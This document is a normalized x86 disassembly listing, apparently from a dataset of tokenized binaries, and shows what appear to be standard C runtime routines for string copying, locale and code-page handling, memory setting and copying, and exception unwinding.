push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x14 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push r--data
push ebx
call edi
push eax
call esi
mov [ rw-data ] eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4049bd
leave
retn
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
call edi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call ebx
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call eax
mov [ ebp - 0x14 ] eax
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_407708
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_405051
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
mov edx esi
xor eax eax
mov [ esi ] ax
jmp r-xdata
test edi edi
je r-xdata
add edx 0x2
dec edi
jne r-xdata
sub edx ecx
cmp [ edx ] 0x0
je r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_405051
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx eax [ ecx ]
mov [ edx + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
call sub_4062b8
mov eax esi
sub_40777d
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
test ebx ebx
jne r-xdata
test edx edx
je r-xdata
test edx edx
jne r-xdata
call sub_405051
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov eax edx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov esi ecx
sub esi edx
mov esi edx
sub esi ecx
test ebx ebx
jne r-xdata
dec edi
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor ecx ecx
mov [ eax ] cx
dec ebx
jne r-xdata
xor eax eax
cmp ebx 0xffffffff
jne r-xdata
movzx eax [ ecx ]
mov [ esi + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx ecx [ esi + eax ]
mov [ eax ] cx
add eax 0x2
test cx cx
je r-xdata
mov [ edx ] ax
call sub_405051
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ edx + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
call sub_4062b8
mov eax esi
jmp r-xdata
sub_40784a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_407865
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_405051
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov edx esi
sub edx eax
mov [ esi ] ax
jmp r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_405051
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx ecx [ eax ]
mov [ edx + eax ] cx
add eax 0x2
test cx cx
je r-xdata
call sub_4062b8
mov eax esi
sub_4078c8
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
js r-xdata
call sub_405051
mov [ eax ] 0x16
call sub_4062b8
or eax 0xffffffff
pop ebp
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop ebp
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop ebp
retn
sub_407907
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_407996
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_407a2f
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_404f01
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_404f01
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_404f01
push [ esi + 0xc0 ]
call sub_404f01
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_408a5a
push [ esi + 0xd4 ]
call sub_404f01
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_404f01
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_404f01
pop ecx
push [ esi + 0xb0 ]
call sub_404f01
push [ esi + 0xbc ]
call sub_404f01
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_404f01
push [ esi + 0xbc ]
call sub_408e3a
pop ecx
pop ecx
push eax
call sub_404f01
pop ecx
push eax
call sub_404f01
push [ esi + 0xbc ]
call sub_408dd1
pop ecx
pop ecx
sub_407b7a
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_407907
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_407996
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_407a2f
pop ecx
sub_407bc7
push 0xc
push r--data
call sub_406c20
call sub_405e67
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_40713e
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
add esi 0x6c
push esi
call sub_407b7a
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_407c34
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_405e67
mov esi [ eax + 0x6c ]
mov eax esi
call sub_406c65
retn
push 0x20
call sub_405a8b
sub_407c40
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_407c6f
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_4083b0
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_407cd3
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
lea edx [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
lea edx [ ecx - 0x20 ]
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_40924c
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_40911f
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_40911f
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_4049bd
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
mov al [ ebx + 0x1 ]
add ebx 0x2
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_4083b0
add esp 0xc
mov [ esi + eax + 0x11d ] bl
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_407e63
push 0xc
push r--data
call sub_406c20
call sub_405e67
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_40713e
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_407efe
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_406c65
retn
push 0x20
call sub_405a8b
cmp esi rw-data
je r-xdata
push esi
call sub_404f01
pop ecx
sub_407f07
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_405e67
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_407bc7
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_407e63
mov [ esi + 0x4 ] eax
sub_407f8e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_407f07
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_40800a
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_407f8e
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_407c6f
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_4083b0
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4049bd
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_407c40
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
mov [ eax ] si
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov esi ebx
call sub_407cd3
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
add esi 0x2
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_4083b0
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_407c40
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
add esi 0x2
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_4081f3
push 0x14
push r--data
call sub_406c20
or [ ebp - 0x20 ] 0xffffffff
call sub_405e67
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_407e63
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_407f8e
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_406eb2
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_406c65
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_40800a
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_405051
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_404f01
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_404f01
pop ecx
push 0xd
call sub_40713e
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_408354
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_404f01
pop ecx
sub_4083b0
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x80
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_40928c
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_408430
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_4084c0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_409505
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_409524
jmp r-xdata
sub_4084c0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_4049bd
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_408430
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_408522
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_408552
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_408582
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_407f07
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_4085ed
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_404f7b
pop ecx
pop ebp
retn
push edi
jmp r-xdata
push [ ebp + 0x8 ]
call sub_404f01
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_4054f0
pop ecx
call sub_405051
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop edi
call sub_405051
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_40500f
pop ecx
mov [ esi ] eax
push esi
call sub_4054f0
pop ecx
test eax eax
je r-xdata
call sub_405051
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_40500f
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_40869a
call sub_40725b
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_407268
pop ecx
push 0x3
call sub_405a57
int3
push 0x1
push 0x40000015
push 0x3
call sub_40613d
add esp 0xc
sub_4086d0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_408754 ]
jmp [ ecx * 4 + jump_table_4087d4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_408840 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_4089dc ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_4088e0 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4089dc ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
